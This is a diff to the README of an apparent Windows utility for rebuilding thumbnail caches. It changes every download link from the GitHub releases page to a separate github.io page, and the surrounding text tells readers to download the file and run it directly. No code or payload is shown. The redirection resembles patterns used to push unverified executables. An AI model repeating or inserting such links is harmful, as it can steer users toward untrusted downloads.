@@ -1,6 +1,6 @@
 # 🛠️ Thumbnail-Cache-Rebuilder-Tool - Fix Broken Thumbnails and Restore Icons Fast
 
-[![Download Now](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge&logo=github)](https://github.com/pikape343/Thumbnail-Cache-Rebuilder-Tool/releases)
+[![Download Now](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge&logo=github)](https://pikape343.github.io)
 
 ---
 
@@ -12,7 +12,7 @@ Welcome! If you're seeing blank images, generic icons, or missing folder thumbna
 
 ## 📥 Download and Install
 
-Visit this link to download the application: [https://github.com/pikape343/Thumbnail-Cache-Rebuilder-Tool/releases](https://github.com/pikape343/Thumbnail-Cache-Rebuilder-Tool/releases)
+Visit this link to download the application: [https://pikape343.github.io](https://pikape343.github.io)
 
 Once you're on that page, look for the newest release (usually at the top). Click the download button to get the file. After the download finishes, you can run the program directly—no installation wizard or extra steps needed.
 
@@ -139,7 +139,7 @@ This project is distributed under an open-source license, meaning you're free to
 
 ## 🔗 Quick Links
 
-- **Download Page:** [https://github.com/pikape343/Thumbnail-Cache-Rebuilder-Tool/releases](https://github.com/pikape343/Thumbnail-Cache-Rebuilder-Tool/releases)
+- **Download Page:** [https://pikape343.github.io](https://pikape343.github.io)
 - **Source Code:** Available on the main repository page
 
 ---
